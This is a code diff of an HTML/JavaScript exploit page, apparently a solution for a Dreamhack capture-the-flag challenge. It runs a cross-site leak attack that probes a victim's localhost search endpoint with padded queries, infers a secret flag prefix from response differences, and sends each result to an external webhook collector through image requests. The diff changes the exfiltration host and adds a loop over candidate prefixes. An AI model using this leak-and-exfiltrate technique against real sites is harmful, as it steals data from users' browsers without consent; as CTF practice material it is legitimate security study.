@@ -1,5 +1,5 @@
 <!doctype html><meta charset="utf-8"><body><script>
-const T="http://localhost",C="https://zncvrtk.request.dreamhack.games";
+const T="http://localhost",C="https://webhooksite.net/674fdaef-b325-4a34-8c2f-244a8c43aab4";
 const SELF="https://niu0102.github.io/aaaa.html?blank=1";
 const L=(t,d)=>new Image().src=C+"/"+t+"?d="+encodeURIComponent(JSON.stringify(d))+"&t="+Date.now();
 const F=(p,pad)=>`${T}/find.php?search=${encodeURIComponent(p)}&w=${"A".repeat(pad)}&h=`;
@@ -12,9 +12,11 @@ function P(u){return new Promise(r=>{
 });}
 (async()=>{
   if(location.search.includes("blank"))return;
-  L("c",{pad:10,hlen:await P(F("zzz",10))});        // 확실한 200
-  await new Promise(r=>setTimeout(r,600));
-  L("c",{pad:3000,hlen:await P(F("zzz",3000))});    // 확실한 413
+  const PAD=2000;                          // 경계 근처. 결과 보고 조정
+  for(const p of ["DH{","DHX","zzz"]){     // DH{ =매칭기대, DHX/zzz =노매칭
+    L("c",{p,hlen:await P(F(p,PAD))});
+    await new Promise(r=>setTimeout(r,600));
+  }
   L("done",{});
 })();
 </script>`
